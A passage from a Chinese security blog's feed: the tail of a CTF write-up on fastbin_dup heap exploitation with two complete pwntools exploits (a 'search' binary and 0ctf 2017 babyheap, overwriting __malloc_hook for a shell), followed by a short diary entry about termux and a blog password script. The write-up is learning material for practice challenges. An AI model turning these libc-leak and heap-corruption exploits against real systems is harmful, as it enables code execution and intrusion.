class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line"></span><br><span class="line">p = process(&apos;./search-bf61fbb8fa7212c814b2607a81a84adf&apos;)</span><br><span class="line"></span><br><span class="line"># binsh_offset 找不到</span><br><span class="line">pop_rdi_ret = 0x400e23</span><br><span class="line">system_offset = 0x46590</span><br><span class="line">puts_offset = 0x6fd60</span><br><span class="line">binsh_offset = 1558723</span><br><span class="line"></span><br><span class="line">def leak_stack():</span><br><span class="line">    p.sendline(&apos;A&apos;*48)</span><br><span class="line">    p.recvuntil(&apos;Quit\n&apos;)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    # doesn&apos;t work all the time</span><br><span class="line">    p.sendline(&apos;A&apos;*48)</span><br><span class="line">    leak = p.recvline().split(&apos; &apos;)[0][48:]</span><br><span class="line">    return int(leak[::-1].encode(&apos;hex&apos;), 16)</span><br><span class="line"></span><br><span class="line">def leak_libc():</span><br><span class="line">    # this sentence is the same size as a list node</span><br><span class="line">    index_sentence((&apos;a&apos;*12 + &apos; b &apos;).ljust(40, &apos;c&apos;))</span><br><span class="line"></span><br><span class="line">    # delete the sentence</span><br><span class="line">    search(&apos;a&apos; * 12)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">    # the node for this sentence gets put in the previous sentence&apos;s spot.</span><br><span class="line">    # note we made sure this doesn&apos;t reuse the chunk that was just freed by</span><br><span class="line">    # making it 64 bytes</span><br><span class="line">    index_sentence(&apos;d&apos; * 64)</span><br><span class="line"></span><br><span class="line">    # free the first sentence again so we can allocate something on top of it.</span><br><span class="line">    # this will work because 1) the sentence no longer starts with a null byte</span><br><span class="line">    # (in fact, it should be clear that it starts a pointer to 64 d&apos;s), and 2)</span><br><span class="line">    # the location where our original string contained `b` is guaranteed to be</span><br><span class="line">    # zero. this is because after the original sentence was zeroed out, nothing</span><br><span class="line">    # was allocated at offset 12, which is just padding in the structure. if</span><br><span class="line">    # we had made the first word in the string 16 bytes instead of 12, then that</span><br><span class="line">    # would put &apos;b&apos; at a location where it would not be guaranteed to be zero.</span><br><span class="line">    search(&apos;\x00&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">    # make our fake node</span><br><span class="line">    node = &apos;&apos;</span><br><span class="line">    node += p64(0x400E90) # word pointer &quot;Enter&quot;</span><br><span class="line">    node += p64(5) # word length</span><br><span class="line">    node += p64(0x602028) # sentence pointer (GOT address of free)</span><br><span class="line">    node += p64(64) # length of sentence</span><br><span class="line">    node += p64(0x00000000) # next pointer is null</span><br><span class="line">    assert len(node) == 40</span><br><span class="line"></span><br><span class="line">    # this sentence gets allocated on top of the previous sentence&apos;s node.</span><br><span class="line">    # we can thus control the sentence pointer of that node and leak memory.</span><br><span class="line">    index_sentence(node)</span><br><span class="line"></span><br><span class="line">    # this simply receives all input from the binary and discards it, which</span><br><span class="line">    # makes parsing out the leaked address easier below.</span><br><span class="line">    p.clean()</span><br><span class="line"></span><br><span class="line">    # leak the libc address</span><br><span class="line">    search(&apos;Enter&apos;)</span><br><span class="line">    p.recvuntil(&apos;Found 64: &apos;)</span><br><span class="line">    leak = u64(p.recvline()[:8])</span><br><span class="line">    p.sendline(&apos;n&apos;) # deleting it isn&apos;t necessary</span><br><span class="line">    return leak</span><br><span class="line"></span><br><span class="line">def index_sentence(s):</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def search(s):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def make_cycle():</span><br><span class="line">    index_sentence(&apos;a&apos;*54 + &apos; d&apos;)</span><br><span class="line">    index_sentence(&apos;b&apos;*54 + &apos; d&apos;)</span><br><span class="line">    index_sentence(&apos;c&apos;*54 + &apos; d&apos;)</span><br><span class="line"></span><br><span class="line">    search(&apos;d&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    search(&apos;\x00&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;n&apos;)</span><br><span class="line"></span><br><span class="line">def make_fake_chunk(addr):</span><br><span class="line">    # set the fwd pointer of the chunk to the address we want</span><br><span class="line">    fake_chunk = p64(addr)</span><br><span class="line">    index_sentence(fake_chunk.ljust(56))</span><br><span class="line"></span><br><span class="line">def allocate_fake_chunk(binsh_addr, system_addr):</span><br><span class="line">    # allocate twice to get our fake chunk</span><br><span class="line">    index_sentence(&apos;A&apos;*56)</span><br><span class="line">    index_sentence(&apos;B&apos;*56)</span><br><span class="line"></span><br><span class="line">    # overwrite the return address</span><br><span class="line">    buf = &apos;A&apos;*30</span><br><span class="line">    buf += p64(pop_rdi_ret)</span><br><span class="line">    buf += p64(binsh_addr)</span><br><span class="line">    buf += p64(system_addr)</span><br><span class="line">    buf = buf.ljust(56, &apos;C&apos;)</span><br><span class="line"></span><br><span class="line">    index_sentence(buf)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    stack_leak = leak_stack()</span><br><span class="line"></span><br><span class="line">    # This makes stack_addr + 0x8 be 0x40  //在泄露的栈地址附近寻找0x40用于充当fakechunk的size</span><br><span class="line">    stack_addr = stack_leak + 0x5a - 8</span><br><span class="line"></span><br><span class="line">    log.info(&apos;stack leak: %s&apos; % hex(stack_leak))</span><br><span class="line">    log.info(&apos;stack addr: %s&apos; % hex(stack_addr))</span><br><span class="line"></span><br><span class="line">    libc_leak = leak_libc()</span><br><span class="line">    libc_base = libc_leak - puts_offset</span><br><span class="line">    system_addr = libc_base + system_offset</span><br><span class="line">    binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">    log.info(&apos;libc leak: %s&apos; % hex(libc_leak))</span><br><span class="line">    log.info(&apos;libc_base: %s&apos; % hex(libc_base))</span><br><span class="line">    log.info(&apos;system addr: %s&apos; % hex(system_addr))</span><br><span class="line">    log.info(&apos;binsh addr: %s&apos; % hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">    make_cycle()</span><br><span class="line">    make_fake_chunk(stack_addr)</span><br><span class="line">    allocate_fake_chunk(binsh_addr, system_addr)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="例题-0ctfbabyheap"><a href="#例题-0ctfbabyheap" class="headerlink" title="例题-0ctfbabyheap"></a>例题-0ctfbabyheap</h1><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><p>炒鸡正规的条件选项题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./0ctfbabyheap </span><br><span class="line">===== Baby Heap in 2017 =====</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br><span class="line">Command:</span><br></pre></td></tr></table></figure><p>分配的块可以分析出有一个结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">         struc_4  structure&#123; </span><br><span class="line">00000000 inuse          </span><br><span class="line">00000001 size         </span><br><span class="line">00000002 ptr           </span><br><span class="line">00000003 &#125;struc_4   ends</span><br></pre></td></tr></table></figure><p>inuse可以标记块的释放与否，size记录大小，ptr指向分配的内存地址；</p><p>各个选项就不一一列举了，每个选项就如它名字一般：<br>allocate使用calloc分配块，最大4096；<br>fill填充用户指定allocate分配的块及新的size，所以很明显可以覆盖指针云云；<br>free将inuse变为0，size归零，free掉指针，但是并未将其指向null；但是因为allocate时使用的是calloc将原空间置零，所以无法UAF。<br>dump检测完inuse位，之后可以将size大小的ptr指向的地址的内容打印出来。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><em>即使这个程序的漏洞这么明显，还是不知道怎么下手，满脑子unlink？？不过鉴于这是fastbin_dup处的学习，学学大佬们的思路。</em></p><p>目标：1.leak libc地址<br>      2.利用fastbin_dup将chunk分配到malloc_hook处（malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写 malloc_hook 来 getshell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx  (long long)(&amp;main_arena)-0x30</span><br><span class="line">0x7fa3a2008c10 &lt;_IO_wide_data_0+304&gt;:0x00007fa3a2004d600x0000000000000000</span><br><span class="line">0x7fa3a2008c20 &lt;__memalign_hook&gt;:0x00007fa3a1ed4bf00x00007fa3a1ed5160</span><br><span class="line">0x7fa3a2008c30 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000  &lt;-- malloc hook </span><br><span class="line">0x7fa3a2008c40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008ca0 &lt;main_arena+96&gt;:0x000055b8638813600x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./0ctfbabyheap&apos;)</span><br><span class="line">ENV = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;</span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">    sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def fill(index,content):</span><br><span class="line">    sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    sh.sendline(str(len(content)))</span><br><span class="line">    sh.recvuntil(&apos;Content: &apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">    sh.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    sh.sendline(&quot;4&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">#---------</span><br><span class="line"> </span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x80)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#----------leak libc base-----------</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">fill(0,&apos;a&apos;*0x10+p64(0)+p64(0x21)+p8(0x80))</span><br><span class="line">fill(3,&apos;d&apos;*0x10+p64(0)+p64(0x21))</span><br><span class="line"></span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">fill(3,&apos;d&apos;*0x10+p64(0)+p64(0x91))</span><br><span class="line">allocate(0x80)</span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line">dump(2)</span><br><span class="line">sh.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">leak_addr = u64(sh.recv(8))</span><br><span class="line">main_arena = leak_addr - 88</span><br><span class="line">libc_base = main_arena - 0x3c4b20</span><br><span class="line">print &apos;main_arena: &apos;+hex(main_arena)</span><br><span class="line">print &apos;libc_base: &apos;+hex(libc_base)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#------------hjack malloc_hook --------</span><br><span class="line">one_gadget_off = 0x4526a</span><br><span class="line">one_gadget_addr = libc_base + one_gadget_off</span><br><span class="line">print &apos;one_gadget_addr: &apos;+hex(one_gadget_addr)</span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line">fill(2,p64(main_arena - 0x33))</span><br><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)</span><br><span class="line"></span><br><span class="line">fill(6,&apos;a&apos;*0x13+p64(one_gadget_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x100)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>reference:<br><a href="https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1" target="_blank" rel="noopener">https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1</a><br><a href="https://bbs.pediy.com/thread-223461.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223461.htm</a></p><p><em>没有人指导堆的学习，日常入门到入土，太难受了。主要是前天打比赛结果很惨烈，希望能加把劲把基础的堆问题给解决掉，下次比赛尽量能够解决一些堆的题。</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;尽量去有秩序的入门堆。。。但大部分堆看起来都太痛苦了。。&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;fastbin-dup原理&quot;&gt;&lt;a href=&quot;#fastbin-dup原理&quot; class=&quot;headerlink&quot; title=&quot;fastbin_dup原理&quot;&gt;&lt;/a&gt;fa
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Diary.20181008</title>
    <link href="http://siriuswhiter.tk/2018/10/08/diary-20181008/"/>
    <id>http://siriuswhiter.tk/2018/10/08/diary-20181008/</id>
    <published>2018-10-08T13:10:48.000Z</published>
    <updated>2018-10-15T12:17:30.737Z</updated>
    
    <content type="html"><![CDATA[<p>  下午摸了一道题，比较简单的格式化字符串；之后摸手机端的 termux ，试图在上面安装 nmap，metasploit；<br>nmap还是很顺利的，但是metasploit搞到自闭……各种安装包问题，一步一步的找问题找解决方法才好不容易把解决；<br>黑域brevent也搞了半天，最后我还是选择绿色守护……手机最近掉电掉的有点严重，必须管一管了；<br>配合帅气的termux，搞了个hacker’s keyboard ，打起字来方便了不少， 还换了个hacker live wallpaper，也就是像是黑客帝国那样的动态壁纸，hhhh整个手机炫酷了不少。<br>周四林少华老师要来学校做客震旦讲堂！！！一定要过去，顺便看能不能混个签名hhh</p><p>…搞了半天特定文章的加密，反而全都无法通过，搞不懂怎么回事…真麻烦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        if(&apos;&#123;&#123; page.password&#125;&#125;&apos; !== 0)&#123;</span><br><span class="line">            if (prompt(&apos;PASSWORD&apos;) !== &apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123;</span><br><span class="line">                alert(&apos;Wrong！&apos;);</span><br><span class="line">                history.back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上面这个运用js的alert阻断机制，但是会把我所有文章都加密。。<br>这下好了，越来越糟糕</p><p>hexo-blog-encrypt 这个组件都不能用。。没办法了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  下午摸了一道题，比较简单的格式化字符串；之后摸手机端的 termux ，试图在上面安装 nmap，metasploit；&lt;br&gt;nmap还是很顺利的，但是metasploit搞到自闭……各种安装包问题，一步一步的找问题找解决方法才好不容易把解决；&lt;br&gt;黑域breven
      
    
    </summary>
    
      <category term="diary" scheme="http://siriuswhiter.tk/categories/diary/"/>
    
    
      <category term="diary" scheme="http://siriuswhiter.tk/tags/diary/"/>
    
  </entry>
  
</feed>
